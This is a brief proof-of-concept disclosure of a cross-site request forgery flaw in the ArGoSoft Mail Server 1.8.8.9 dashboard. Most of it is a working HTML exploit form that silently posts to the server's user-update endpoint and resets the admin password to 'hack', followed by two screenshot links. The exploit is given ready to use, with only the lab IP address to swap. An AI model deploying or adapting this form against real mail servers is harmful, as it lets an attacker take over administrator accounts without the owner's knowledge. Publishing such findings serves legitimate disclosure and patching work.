# CSRF on ArGoSoft Mail Server 1.8.8.9

_____________________________________________

## About ArGo Soft Mail Server

Website: https://www.argosoft.com/rootpages/MailServer/Default
______________________________________________

## CSRF on ArGo Soft Mail Server 1.8.8.9

The ArGo Soft Mail Server dashboard does not have protection against attacks of the type Cross Site Request Forgery (CSRF), making it possible to use the exploit below to change the admin password:

'''
<!DOCTYPE html>
<html>
<body>
	<form method="POST" action="http://192.168.56.105:80/upduser">
		<input type="text" name="realname" value="admin">
		<input type="text" name="password" value="hack">
		<input type="text" name="confirmpassword" value="hack">
		<input type="text" name="forwardaddress" value="">
		<input type="text" name="keepcopies" value="N">
		<input type="text" name="returnaddress" value="">
		<input type="text" name="fingerinfo" value="">
		<input type="text" name="respondersubject" value="">
		<input type="text" name="responderdata" value="">
		<input type="submit" value="Send">
	</form>
</body>

'''

![a1](http://sejalivre.org/poc3/argo1.png)

![a2](http://sejalivre.org/poc3/argo2.png)
_______________________________________________
